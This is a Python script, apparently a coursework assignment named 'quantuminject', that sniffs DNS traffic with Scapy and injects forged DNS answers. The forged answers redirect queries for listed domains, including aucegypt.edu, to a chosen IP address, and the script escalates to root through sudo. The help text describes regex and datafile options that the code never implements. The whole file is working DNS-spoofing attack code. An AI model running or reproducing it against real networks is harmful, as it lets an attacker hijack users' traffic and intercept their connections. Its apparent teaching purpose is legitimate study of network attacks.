#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-
import os as OS
import sys as System
import subprocess as Process
import scapy.all as Scapy

def printHelp():
    print """
    quantuminject [­-i interface] [­-r regexp] [­-d datafile] expression

    -i --interface Listen on network device (e.g., eth0). If not specified, quantuminject should select a default interface to listen on. The same interface should be used for packet injection.

    ­-r --regex Use regular expression to match the request packets for which a response will be spoofed.

    ­-d --data Read the raw data that will be used as the TCP payload of the spoofed response packet from <datafile>
    """

spoofed_ip = '192.168.64.1'

target_addresses = ['aucegypt.edu', 'obiwan.kenobi']

def handle(packet):
    DNS = Scapy.DNS
    IP = Scapy.IP
    UDP = Scapy.UDP
    DNSQR = Scapy.DNSQR
    DNSRR = Scapy.DNSRR
    if (
        packet.haslayer(DNSQR) and
        not packet.haslayer(DNSRR)
    ):
        for target_address in target_addresses:
            if target_address in str(packet['DNS Question Record'].qname):
                response = IP(version=4, dst=packet[IP].src, src=packet[IP].dst)\
                    /UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)\
                    /DNS(id=packet[DNS].id, ancount=1, qd=packet[DNSQR], an=DNSRR(rrname = packet[DNSQR].qname, rdata = spoofed_ip, ttl = 21599))
                response.show()
                Scapy.sendp(response, iface="bridge100")
                print '* Spoofed ' + target_address + ' response to ' + packet[IP].src + '.'
    elif (
        packet.haslayer(DNSQR) and
        packet.haslayer(DNSRR) and
        packet[IP].src == '8.8.8.8'
    ):
        packet.show()



if OS.getuid() != 0:
    print "This script will require root privileges. Attempting to elevate..."
    Process.call(["sudo"] + System.argv)
    exit(77)


Scapy.sniff(prn=handle, iface= "bridge100")
